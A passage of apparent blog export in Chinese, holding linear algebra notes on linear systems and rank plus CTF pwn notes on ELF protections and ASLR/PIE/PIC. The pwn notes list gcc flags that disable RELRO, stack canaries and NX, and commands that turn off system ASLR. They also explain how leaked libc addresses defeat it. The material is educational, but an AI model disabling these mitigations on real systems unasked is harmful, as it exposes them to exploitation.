<li>第三种，将$A$按列分块得$A=(\alpha_1,\alpha_2,\cdots,\alpha_n)$，方程可表示为$x_1\alpha_1+x_2\alpha_2+\cdots+x_n\alpha_n=b$</li>
</ul>
<p>方程的解也可以指解向量$x$。</p>
<p><strong>方程组的等价</strong>指的是两个方程组的解的集合是一样的。</p>
<p>需要指出的是，对增广矩阵进行标准行变换后，相当于对第一种形式中的方程进行整体加减抵消，新方程组等价原方程组。我们可以利用这种记法（数学工具），更快速高效地对方程组进行处理。</p>
<h2 id="3-2-线性方程组解的判定"><a href="#3-2-线性方程组解的判定" class="headerlink" title="3.2 线性方程组解的判定"></a>3.2 线性方程组解的判定</h2><p>一般来说，对于线性方程组解的判定，无论齐次还是非齐次，都有两种方法：</p>
<ul>
<li>通用判定：用系数矩阵和增广矩阵的秩来判定</li>
<li>特殊判定（$n=m$时），用克拉默法则来判定</li>
</ul>
<p>对于确定的增广矩阵，两者的速度因题而异（如果特殊判定能用的话）。但是克拉默法则没办法区分非齐次线性方程组的无穷解和无解。</p>
<p>但是对于增广矩阵中含有未知数并让你讨论时，很多时候通用判定会卡住，这时，特殊判定有很大优势。这能让你提前分好类进行讨论，不用纠结于初等行变换时行首是否为零的问题。</p>
<p>tips：如果要用通用判定，将增广矩阵做初等行变换至行阶梯形矩阵（行最简形矩阵更好），这样也方便下一步求解。</p>
<h3 id="3-2-1-对于一般线性方程组"><a href="#3-2-1-对于一般线性方程组" class="headerlink" title="3.2.1 对于一般线性方程组"></a>3.2.1 对于一般线性方程组</h3><p>此一般包括齐次线性方程组。</p>
<p>通用判定如下：</p>
<ul>
<li>$r(A)&lt;r(A,b)$，无解</li>
<li>$r(A)=r(A,b)&lt;n$，无穷解</li>
<li>$r(A)=r(A,b)=n$，唯一解</li>
</ul>
<p>特殊判定：仅当方程组的未知量数等于方程数时，即$A$是一个方阵时，由克拉默法则得：</p>
<ul>
<li>$\left| A\right| \neq 0$，方程组有唯一解。</li>
<li>$\left| A\right| = 0$，方程组有无穷解或无解。</li>
</ul>
<h3 id="3-2-2-对于齐次线性方程组"><a href="#3-2-2-对于齐次线性方程组" class="headerlink" title="3.2.2 对于齐次线性方程组"></a>3.2.2 对于齐次线性方程组</h3><p>对于齐次线性方程组，$x=0$这个解是确定的，这意味着$r(A)=r(A,b)$。<br>在使用通用判定时，只需对系数矩阵操作即可。</p>
<p>此时，方程组只有两种情况：</p>
<ul>
<li>有唯一解，没有非零解。</li>
<li>有无穷解，有非零解。</li>
</ul>
<p>这时，相较于一般线性方程组，我们能讨论得更细致些。</p>
<p>通用判定：</p>
<ul>
<li>$r(A)&lt;n$，方程有无穷解</li>
<li>$r(A)=n$，方程有唯一解</li>
</ul>
<p>特殊判定：<br>仅当方程组的未知量数等于方程数时，即$A$是一个方阵时，由克拉默法则得：</p>
<ul>
<li>$\left| A\right| \neq 0$，方程组有唯一解，没有非零解。</li>
<li>$\left| A\right| = 0$，方程组有无穷解，有非零解。</li>
</ul>
<h2 id="3-3-求解线性方程组"><a href="#3-3-求解线性方程组" class="headerlink" title="3.3 求解线性方程组"></a>3.3 求解线性方程组</h2><p>特殊方法（m=n）：使用克拉默法则（计算量不小）。</p>
<p>一般方法如下：</p>
<ul>
<li>首先做初等行变换化简增广矩阵（齐次线性方程组就只用化简系数矩阵）。</li>
<li>tips:如果化为行最简形矩阵，下面的求解会非常方便，因为只化为行阶梯形矩阵在下面要进行的求解实际上是将行阶梯形矩阵化为行最简形矩阵。</li>
<li>如果有未知量无法满足约束条件的，方程组无解。</li>
<li>如果方程组有唯一解的，就解呗。</li>
<li>如果方程组有无穷解的话，将会有$r(A)$个未知量失去约束，变为自由未知量，可以赋给它们一个字母（代表它们在任意值中取的数），代入约束的方程中，将剩下$n-r(A)$个非自由未知量用自由未知量表示出来。</li>
</ul>
<h2 id="3-4-线性方程组解的结构"><a href="#3-4-线性方程组解的结构" class="headerlink" title="3.4 线性方程组解的结构"></a>3.4 线性方程组解的结构</h2><p>首先你一定要去<strong>4向量与矩阵的秩</strong>去看看极大线性无关组了。</p>
<h3 id="3-4-1-齐次线性方程组的解的结构及其基础解系"><a href="#3-4-1-齐次线性方程组的解的结构及其基础解系" class="headerlink" title="3.4.1 齐次线性方程组的解的结构及其基础解系"></a>3.4.1 齐次线性方程组的解的结构及其基础解系</h3><h4 id="3-4-1-1-齐次线性方程组解的结构"><a href="#3-4-1-1-齐次线性方程组解的结构" class="headerlink" title="3.4.1.1 齐次线性方程组解的结构"></a>3.4.1.1 齐次线性方程组解的结构</h4><p>若$\xi_1,\xi_2$都是$Ax=0$的解，则$k_1\xi_1+k_2\xi_2$（$k_1,k_2$为任意实数）也是它的解。</p>
<h4 id="3-4-1-2-齐次线性方程组的基础解系"><a href="#3-4-1-2-齐次线性方程组的基础解系" class="headerlink" title="3.4.1.2 齐次线性方程组的基础解系"></a>3.4.1.2 齐次线性方程组的基础解系</h4><p>定义$Ax=0$的一个基础解系为它解向量构成的向量空间的一个极大线性无关组。<br><del>这定义都写到第五章的东西了，复习写的嘛。</del></p>
<p>基础解系的性质：</p>
<ul>
<li>该基础解系含有$n-r(A)$个向量</li>
<li>极大线性无关组的性质<ul>
<li>基础解系不唯一</li>
<li>基础解系线性无关</li>
<li>其他性质等</li>
</ul>
</li>
</ul>
<p>对系数矩阵$A$进行初等行变换，一定可以得到</p>
<script type="math/tex; mode=display">\begin{pmatrix}
1 & 0 & \cdots & 0 & c_{1,r+1} & \cdots & c_{1,n}\\
0 & 1 & \cdots & 0 & c_{2,r+1} & \cdots & c_{2,n}\\
\vdots & \vdots & \ddots & \vdots & \vdots &  & \vdots \\
0 & 0 & \cdots & 1 & c_{r,r+1} & \cdots & c_{r,n}\\
0 & 0 & \cdots & 0 & 0 & \cdots & 0\\
\vdots & \vdots &  & \vdots & \vdots &  & \vdots \\
0 & 0 & \cdots & 0 & 0 & \cdots & 0\\
\end{pmatrix}</script><p>其中$r=r(A)$</p>
<h4 id="3-4-1-3-求解基础解系"><a href="#3-4-1-3-求解基础解系" class="headerlink" title="3.4.1.3 求解基础解系"></a>3.4.1.3 求解基础解系</h4><p>下面开始解出齐次线性方程组的基础解系：</p>
<ul>
<li>若将解向量$x$表示为$(x_1,x_2,\cdots,x_n)^T$</li>
<li>取$\begin{pmatrix}<br>x_{r+1} \\ x_{r+2} \\ \vdots \\ x_n<br>\end{pmatrix}<br>= \begin{pmatrix}<br>1 \\ 0 \\ \vdots \\ 0<br>\end{pmatrix}<br>,<br>\begin{pmatrix}<br>0 \\ 1 \\ \vdots \\ 0<br>\end{pmatrix}<br>,\cdots<br>\begin{pmatrix}<br>0 \\ 0 \\ \vdots \\ 1<br>\end{pmatrix}$</li>
<li>得x=<br>$\begin{pmatrix}<br>-c_{1,r+1} \\ -c_{2,r+1} \\ \vdots \\ -c_{r,r+1} \\ 1 \\ 0 \\ \vdots \\ 0<br>\end{pmatrix}<br>,<br>\begin{pmatrix}<br>-c_{1,r+2} \\ -c_{2,r+2} \\ \vdots \\ -c_{r,r+2} \\ 0 \\ 1 \\ \vdots \\ 0<br>\end{pmatrix}<br>,\cdots,<br>\begin{pmatrix}<br>-c_{1,n} \\ -c_{2,n} \\ \vdots \\ -c_{r,n} \\ 0 \\ 0 \\ \vdots \\ 1<br>\end{pmatrix}$共$n-r(A)$个解向量，一般记为$\xi_1,\xi_2,\cdots,\xi_{n-r}$由极大线性无关组（向量的维度）部分无关，加长无关，知这些解线性无关。</li>
</ul>
<p>向量组$\xi_1,\xi_2,\cdots,\xi_{n-r}$称为$Ax=0$的一个基础解系。</p>
<h4 id="3-4-1-4-齐次线性方程组的通解"><a href="#3-4-1-4-齐次线性方程组的通解" class="headerlink" title="3.4.1.4 齐次线性方程组的通解"></a>3.4.1.4 齐次线性方程组的通解</h4><p>齐次线性方程组的通解为其基础解系的线性组合，即$x=k_1\xi_1+k_2\xi_2+\cdots+k_{n-r}\xi_{n-r}$。</p>
<h3 id="3-4-2-非齐次线性方程组解的结构"><a href="#3-4-2-非齐次线性方程组解的结构" class="headerlink" title="3.4.2 非齐次线性方程组解的结构"></a>3.4.2 非齐次线性方程组解的结构</h3><p>原理：若$x_1,x_2$是$Ax=b$的解，则$x_1-x_2$是对应齐次方程组$Ax=0$的解。</p>
<p>解的结构：若$Ax=b$有解，其通解可表示为$x=\xi_0+\overline{\xi}$，其中$\xi_0$是$Ax=b$的一个特解，$\overline{\xi}=k_1\xi_1+k_2\xi_2+\cdots+k_{n-r}\xi_{n-r}$是对应齐次线性方程组$Ax=0$的通解。</p>
<p>求解齐次线性方程组；</p>
<ul>
<li>首先需要找出一个特解（越简单越好），记为$\xi_0$。</li>
<li>然后算出该一般线性方程组的导出（对应的齐次线性方程组）的基础解系，记为$\xi_1,\xi_2,\cdots,\xi_r$</li>
<li>特解为$x=\xi_0+\overline{\xi}$，其中，是导出方程组的基础解系的线性组合，即$\overline{\xi}=k_1\xi_1+k_2\xi_2+\cdots+k_{n-r}\xi_{n-r}$</li>
</ul>
<h1 id="4-向量与矩阵的秩"><a href="#4-向量与矩阵的秩" class="headerlink" title="4 向量与矩阵的秩"></a>4 向量与矩阵的秩</h1><p><strong>tips：未特殊说明的向量一律为实列向量</strong></p>
<h2 id="4-1-向量与向量组的关系"><a href="#4-1-向量与向量组的关系" class="headerlink" title="4.1 向量与向量组的关系"></a>4.1 向量与向量组的关系</h2><h3 id="4-1-1-线性组合"><a href="#4-1-1-线性组合" class="headerlink" title="4.1.1 线性组合"></a>4.1.1 线性组合</h3><p>对于给定向量组$A:\alpha_1,\alpha_2,\cdots,\alpha_n$与任意实数组$k_1,k_2,\cdots,k_n$，若有向量$\alpha$使得$\alpha=k_1\alpha_1+k_2\alpha_2+\cdots+k_n\alpha_n$，称向量$\alpha$为向量组$A$的线性组合，称该实数组为该线性组合的系数，称向量$\alpha$可被$A$线性表示</p>
<h3 id="4-1-2-线性相关与线性无关"><a href="#4-1-2-线性相关与线性无关" class="headerlink" title="4.1.2 线性相关与线性无关"></a>4.1.2 线性相关与线性无关</h3><p>定义：<br>对向量组$\alpha_1,\alpha_2,\cdots,\alpha_n$，若存存在不全为0的实数组$k_1,k_2,\cdots,k_n$使得$k_1\alpha_1+k_2\alpha_2+\cdots+k_n\alpha_n=0$，则称向量组线性相关；若只存在全为零的实数组使上式成立，则称向量组线性无关。</p>
<p>性质：</p>
<ul>
<li>等价于齐次线性方程组$(\alpha_1,\alpha_2,\cdots,\alpha_n)<br>\begin{pmatrix}<br>k_1\\k_2\\<br>\vdots \\ k_n<br>\end{pmatrix}=0$是否有非零解</li>
<li>n+1个n维向量一定线性相关</li>
<li>（向量组向量维数）部分无关，加长无关；加长相关，部分相关</li>
<li>（向量组个数）部分相关，整体相关；整体无关，部分无关</li>
</ul>
<h3 id="4-1-3-相关性与线性组合关系"><a href="#4-1-3-相关性与线性组合关系" class="headerlink" title="4.1.3 相关性与线性组合关系"></a>4.1.3 相关性与线性组合关系</h3><ul>
<li>向量组相关的充要条件使至少有1个向量可以由其余n-1个向量线性表示</li>
<li>若$\alpha_1,\alpha_2,\cdots,\alpha_n$线性无关，而$\alpha_1,\alpha_2,\cdots,\alpha_n,\beta$线性相关，则$\beta$可以由$\alpha_1,\alpha_2,\cdots,\alpha_n$唯一线性表示。</li>
</ul>
<h2 id="4-2-向量组间的关系"><a href="#4-2-向量组间的关系" class="headerlink" title="4.2 向量组间的关系"></a>4.2 向量组间的关系</h2><ul>
<li>线性表示：若向量组A中任一向量可以被向量组B中的向量线性表示，则称A可以被B线性表示。</li>
<li>等价：若A和B可以互相线性表示，则称A与B等价，记为$A\sim B$</li>
<li>若向量组$B:\beta_1,\beta_2,\cdots,\beta_n$可被向量组$A:\alpha_1,\alpha_2,\cdots,\alpha_n$线性表示，则有$(\beta_1,\beta_2,\cdots,\beta_t)=(\alpha_1,\alpha_2,\cdots,\alpha_s)<br>\begin{pmatrix}<br>k_{11} &amp; k_{12} &amp; \cdots &amp; k_{1t}\\<br>k_{21} &amp; k_{22} &amp; \cdots &amp; k_{2t}\\<br>\vdots &amp; \vdots &amp; &amp; \vdots \\<br>k_{s1} &amp; k_{s2} &amp; \cdots &amp; k_{st}<br>\end{pmatrix}$，其中可知$\beta_i=k_{11}\alpha_1+k_{21}\alpha_2+\cdots+k_{s1}\alpha_s$。<ul>
<li>这个转化会在<strong>5向量空间</strong>中有更进一步的讨论</li>
</ul>
</li>
<li>等价性的性质：自反、对称、传递</li>
</ul>
<p>一些重要的性质：</p>
<ul>
<li>若线性无关的向量组A可表示向量组B，则向量组A的向量数小于或等于向量组B的向量数</li>
<li>若两个向量组线性无关且等价，则两个向量组由相同的向量数目</li>
<li>若向量组B被线性无关的向量组A表示，且向量组B向量数目大于向量组A的向量数目，则B一定线性相关。</li>
</ul>
<h2 id="4-3-极大线性无关组及向量组的秩"><a href="#4-3-极大线性无关组及向量组的秩" class="headerlink" title="4.3 极大线性无关组及向量组的秩"></a>4.3 极大线性无关组及向量组的秩</h2><h3 id="4-3-1-极大线性无关组"><a href="#4-3-1-极大线性无关组" class="headerlink" title="4.3.1 极大线性无关组"></a>4.3.1 极大线性无关组</h3><h4 id="4-3-1-1-极大线性无关组的定义"><a href="#4-3-1-1-极大线性无关组的定义" class="headerlink" title="4.3.1.1 极大线性无关组的定义"></a>4.3.1.1 极大线性无关组的定义</h4><p>定义：若向量组$A:\alpha_1,\alpha_2,\cdots,\alpha_s$的一个部分组$\alpha_{i_1},\alpha_{i_2},\cdots,\alpha_{i_r}$线性无关且能线性表示A中的所有向量，则该部分组是向量组A的极大线性无关组。</p>
<h4 id="4-3-1-2-极大线性无关组的性质"><a href="#4-3-1-2-极大线性无关组的性质" class="headerlink" title="4.3.1.2 极大线性无关组的性质"></a>4.3.1.2 极大线性无关组的性质</h4><ul>
<li>一个向量组线性无关等价于这个向量组是自己的极大线性无关组。</li>
<li>一个向量组A的一个极大线性无关组能唯一地线性表示该向量组A内的向量。</li>
<li>一个向量组A的线性无关部分组成为极大线性无关组的充要条件是该线性无关部分组能表示该向量组A中的全部向量。</li>
<li>一个向量组与它的所有极大线性无关组等价。</li>
<li>一个向量组的所有极大线性无关组之间等价，且个数均相同。</li>
</ul>
<h4 id="4-3-1-3-求解向量的极大线性无关组"><a href="#4-3-1-3-求解向量的极大线性无关组" class="headerlink" title="4.3.1.3 求解向量的极大线性无关组"></a>4.3.1.3 求解向量的极大线性无关组</h4><ul>
<li>tips:与矩阵找最高阶非零子式类似。</li>
<li>以列向量为例：将向量组$\alpha_1,\alpha_2,\cdots,\alpha_n$写成矩阵$(\alpha_1,\alpha_2,\cdots,\alpha_n)$。</li>
<li>然后将矩阵用初等行变换化为行阶梯形矩阵，取行阶梯形矩阵非零行第一个非零元所在列（共$r(A)$个）。</li>
<li>然后回到原矩阵，找出对应的列，它们就是向量组的极大线性无关组。</li>
</ul>
<h3 id="4-3-2-向量组的秩"><a href="#4-3-2-向量组的秩" class="headerlink" title="4.3.2 向量组的秩"></a>4.3.2 向量组的秩</h3><p>向量组的极大线性无关组中向量的个数为该向量组的秩，记为$rank(A)$或$rank(\alpha_1,\alpha_2,\cdots,\alpha_n)$，简记为$r(A)$或$r(\alpha_1,\alpha_2,\cdots,\alpha_n)$，零向量组成的向量组的秩为0</p>
<p>向量组秩的性质：</p>
<ul>
<li>$A$如果能被$B$线性表示，则$r(A) \le r(B)$</li>
<li>$A\sim B$，则$r(A)=r(B)$</li>
<li>$r(A)=r(B)$且$A$能被$B$线性表示，则$A\sim B$</li>
<li>A线性无关当且仅当A的秩等于其向量数</li>
</ul>
<h2 id="4-4-向量组的秩与矩阵的秩"><a href="#4-4-向量组的秩与矩阵的秩" class="headerlink" title="4.4 向量组的秩与矩阵的秩"></a>4.4 向量组的秩与矩阵的秩</h2><h3 id="4-4-1-矩阵秩的定义"><a href="#4-4-1-矩阵秩的定义" class="headerlink" title="4.4.1 矩阵秩的定义"></a>4.4.1 矩阵秩的定义</h3><ul>
<li>定义1：矩阵的秩等于行向量组的秩等于列向量组的秩</li>
<li>定义2：矩阵所拥有的最高阶非零子式的阶数</li>
</ul>
<h3 id="4-4-2-矩阵的秩的性质"><a href="#4-4-2-矩阵的秩的性质" class="headerlink" title="4.4.2 矩阵的秩的性质"></a>4.4.2 矩阵的秩的性质</h3><ul>
<li>初等变换不改变矩阵的秩</li>
<li>矩阵的秩等于等价的行阶梯形矩阵的行数</li>
<li>设有$A_{m\times n}$，则$0\leq r(A)\leq \min(m,n)$</li>
<li>若$P,Q$可逆，则$r(PAQ)=r(PA)=r(AQ)=r(A)$</li>
<li>$r(A+B) \leq r(A)+r(B)$</li>
<li>$\max(r(A),r(B))\leq r(A,B)\leq r(A)+r(B)$</li>
<li>设有矩阵$A_{m \times n},B_{n \times s}$，则有$r(A)+r(B)-n \leq r(AB) \leq \min(r(A),r(B))$</li>
<li>若$A_{m\times n}B_{n \times l}=0$，则$r(A)+r(B) \leq n$</li>
<li>若$A_{m\times n}B_{n \times l}=C$且$r(A)=n$，则$r(B)=r(C)$</li>
</ul>
<h3 id="求解矩阵的秩（求解矩阵最高阶非0子式）"><a href="#求解矩阵的秩（求解矩阵最高阶非0子式）" class="headerlink" title="求解矩阵的秩（求解矩阵最高阶非0子式）"></a>求解矩阵的秩（求解矩阵最高阶非0子式）</h3><ul>
<li>tips:与求向量极大线性无关组类似</li>
<li>将矩阵用初等行变换化为行阶梯形矩阵，取行阶梯形矩阵非零行第一个非零元所在列（共$r(A)$个）。回到原矩阵，先去对应的$r(A)$列再任取$r(A)$行，找出原矩阵中最高阶非零子式</li>
</ul>
<h1 id="5-向量空间"><a href="#5-向量空间" class="headerlink" title="5 向量空间"></a>5 向量空间</h1><h1 id="6-矩阵的特征值与二次型"><a href="#6-矩阵的特征值与二次型" class="headerlink" title="6 矩阵的特征值与二次型"></a>6 矩阵的特征值与二次型</h1>]]></content>
      <categories>
        <category>线性代数</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn知识点1 elf的安全属性</title>
    <url>/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="elf的安全属性"><a href="#elf的安全属性" class="headerlink" title="elf的安全属性"></a>elf的安全属性</h2><h3 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h3><p>指的是编译环境或是编译器环境之类的。</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="RELRO介绍"><a href="#RELRO介绍" class="headerlink" title="RELRO介绍"></a>RELRO介绍</h4><p>表示对是否有对数据区域的读写进行限制。</p>
<p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。</p>
<p><strong>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对<code>GOT(Global Offset Table)</code>攻击。</strong>（具体看RELRO类型）</p>
<h4 id="RELRO类型"><a href="#RELRO类型" class="headerlink" title="RELRO类型"></a>RELRO类型</h4><p>类型有三种：</p>
<ol>
<li><code>Full RELRO</code> 完全开启只读保护，意味着<code>.plt</code>和<code>.got.plt</code>均为只读</li>
<li><code>Partial RELRO</code> 部分开启只读保护，意味着<code>plt</code>只读，<code>.got.plt</code>可写</li>
<li><code>No RELRO</code> 关闭只读保护，意味着<code>.plt</code>和<code>.got.plt</code>均可写。</li>
</ol>
<ul>
<li>注意：<code>.plt</code>和<code>.plt.got</code>都在代码段，而<code>.got</code>和<code>.got.plt</code>在数据段。这四个东西还是略有不同。<ul>
<li>其中<code>plt.got</code>好像是<code>.plt</code>表向<code>.got</code>的公共跳转代码（即所有函数完成延迟重定位是都经过这一部分获得<code>.got</code>的基准地址）。</li>
</ul>
</li>
</ul>
<h4 id="gcc编译时关于RELRO的控制"><a href="#gcc编译时关于RELRO的控制" class="headerlink" title="gcc编译时关于RELRO的控制"></a>gcc编译时关于RELRO的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，看环境</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，即</span><br></pre></td></tr></table></figure>
<h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h3><h4 id="Stack-Canary功能介绍和原理解释"><a href="#Stack-Canary功能介绍和原理解释" class="headerlink" title="Stack Canary功能介绍和原理解释"></a>Stack Canary功能介绍和原理解释</h4><p>表示栈保护功能有没有开启。</p>
<ul>
<li>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。</li>
<li>当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</li>
<li>在Linux中我们将cookie信息称为canary。</li>
</ul>
<h4 id="gcc编译时关于canary功能的控制"><a href="#gcc编译时关于canary功能的控制" class="headerlink" title="gcc编译时关于canary功能的控制"></a>gcc编译时关于canary功能的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                           //默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c      //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c         //启用堆栈保护，不过只为局部变量中含有char数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c     //启用堆栈保护，为所有函数插入保护代码，只有这种情况checksec才会显示canaryfound</span><br></pre></td></tr></table></figure>
<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><h4 id="NX介绍"><a href="#NX介绍" class="headerlink" title="NX介绍"></a>NX介绍</h4><p>表示是否对内存有进行保护。</p>
<p>个人理解即：<strong>数据段禁止执行</strong></p>
<p>linux上叫NX，windows上类似的叫DEP。</p>
<ul>
<li>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行。</li>
<li>当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li>
</ul>
<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p>
<h4 id="gcc编译时关于NX的控制"><a href="#gcc编译时关于NX的控制" class="headerlink" title="gcc编译时关于NX的控制"></a>gcc编译时关于NX的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                        // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c           // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c         // 开启NX保护</span><br></pre></td></tr></table></figure>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>先说明：<strong>PIE和ASLR不是一个东西</strong>。</p>
<p>且看这一篇吧：<a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR,PIE和PIC的异同</a></p>
<h3 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h3><p>可以在编译时指定程序运行时动态链接库的搜寻路径，防止将一些动态库恶意替换，以达到攻击目的。</p>
<h3 id="Debuginfo"><a href="#Debuginfo" class="headerlink" title="Debuginfo"></a>Debuginfo</h3><p>使用<code>gcc</code>带<code>-g</code>调试选项编译的程序留有用于调试的一些记录，这样的程序会被checksec检测为：<code>Debuginfo: Yes</code>。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn知识点2 ASLR,PIE和PIC的异同</title>
    <url>/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h3 id="ASLR介绍"><a href="#ASLR介绍" class="headerlink" title="ASLR介绍"></a>ASLR介绍</h3><p>进程地址空间各区域随机化，ASLR(Address Space Layout Randomization)。</p>
<p>这是系统级的设置，可以在系统层面全部调整。</p>
<ul>
<li>为了提升系统的安全，增大漏洞的攻击难度，提出了，称之为ASLR(Address Space Layout Randomization)。</li>
<li>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。</li>
<li><strong>它是在程序运行时系统进行的操作，因而只能随机化stack、heap、libraries的基址</strong>。</li>
<li>现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。</li>
</ul>
<h3 id="PIE类型-级别（ASLR保护参数值）"><a href="#PIE类型-级别（ASLR保护参数值）" class="headerlink" title="PIE类型/级别（ASLR保护参数值）"></a>PIE类型/级别（ASLR保护参数值）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0: ASLR 关闭</span><br><span class="line">1: 随机化栈基地址（stack）、共享库（.so\libraries）、mmap基地址</span><br><span class="line">2: 在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure>
<p>来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a></p>
<h3 id="Linux系统设置ASLR"><a href="#Linux系统设置ASLR" class="headerlink" title="Linux系统设置ASLR"></a>Linux系统设置ASLR</h3><ul>
<li>ASLR存储在<code>/proc/sys/kernel/randomize_va_space</code></li>
</ul>
<p>注意：下面<code>echo 0</code>也可以换成<code>echo 1</code>或者<code>echo 2</code>。</p>
<p>Root用户：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
<ul>
<li>注意：非root用户如下设置会报错。因为这样写系统会认为是sudo 命令重定向，而sudo命令不支持重定向。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">bash: /proc/sys/kernel/randomize_va_space: Permission denied</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>正确写法：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>ASLR只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。<br>所以我们可以获取任意的libc库函数的真实地址来确定libc的版本和libc基址，来推得其他敏感libc函数的地址。</p>
<p>这就是<code>LibcSearcher</code>的原理。</p>
<h2 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h2><h3 id="PIE是什么？"><a href="#PIE是什么？" class="headerlink" title="PIE是什么？"></a>PIE是什么？</h3><p>还是来自刚才的来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a>。</p>
<p><strong>PIE 是 gcc 编译器的功能选项，作用于程序（ELF）编译过程中。是一个针对代码段（ .text ）、数据段（ .data ）、未初始化全局变量段（ .bss ）等固定地址的一个防护技术</strong>。</p>
<p>如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具来帮助解题。</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>程序每一次加载都变换基地址，但是不改变指令间的相对地址。</p>
<h3 id="PIE与PIC的区别是什么？"><a href="#PIE与PIC的区别是什么？" class="headerlink" title="PIE与PIC的区别是什么？"></a>PIE与PIC的区别是什么？</h3><p>另一个<a href="https://www.cnblogs.com/rec0rd/p/7646857.html">博客(cnblogs)</a>的定义：</p>
<ul>
<li>PIE（Position Independent Executables）是<strong>编译器（gcc，..）功能选项（-fPIE）</strong>，<strong>作用于excutable编译过程</strong>，可将其理解为<strong>特殊的PIC（so专用，Position Independent Code）</strong>，加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。</li>
</ul>
<p><strong>也就是说，PIC还可以用于编译动态库(.so等)，但PIE只能用于编译ELF。</strong></p>
<h3 id="gcc编译时关于PIE和PIC的控制"><a href="#gcc编译时关于PIE和PIC的控制" class="headerlink" title="gcc编译时关于PIE和PIC的控制"></a>gcc编译时关于PIE和PIC的控制</h3><p>借鉴了别人的<a href="https://www.cnblogs.com/20170722-kong/articles/12291904.html">博客</a>和另一个<a href="https://blog.csdn.net/tabactivity/article/details/126660974">博客</a></p>
